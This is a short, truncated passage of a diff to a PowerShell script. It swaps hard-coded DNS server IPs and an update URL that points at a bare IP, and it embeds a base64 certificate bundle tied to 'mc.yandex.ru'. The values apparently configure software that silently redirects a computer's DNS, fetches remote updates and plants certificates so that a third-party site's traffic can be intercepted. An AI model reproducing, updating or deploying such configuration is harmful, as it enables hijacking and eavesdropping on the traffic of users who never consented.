@@ -1,7 +1,7 @@
-﻿$PrimaryDNSServer = '185.247.141.78'
-$SecondaryDNSServer = '185.247.141.51'
+﻿$PrimaryDNSServer = '213.226.112.111'
+$SecondaryDNSServer = '195.58.51.168'
 $autoUpdate = ''
-$updateUrl = 'http://185.247.141.76/data/update.txt'
+$updateUrl = 'http://213.226.112.110/data/update.txt'
 $xdata = @{
     'mc.yandex.ru'='MIIKsQIBAzCCCm0GCSqGSIb3DQEHAaCCCl4EggpaMIIKVjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAg7b907Z/l3VAICB9AEggTYV4Gwenr9KDAv3madoOk1EeF82TazbxTdlpCswTGL'+ 
 'IAQILTlqcPV/Gmp+Rn+//oP5vTJs0rRSP2Jm1Dj5J1XH4eySKWYJGIZ7B7EMNaxtSLep+0CDRTdEgRdRUNcgzZ6q+0sXRbdrTJtgP+EY4raH36QYFc0SThhDBYUFXmORAXiMPjd4Qyvch9WBVbL4Mry7OReP9hVofX4FJ7K9I0zzY2uYCkI7eyN9OsB50bbzD8ON99lr'+ 
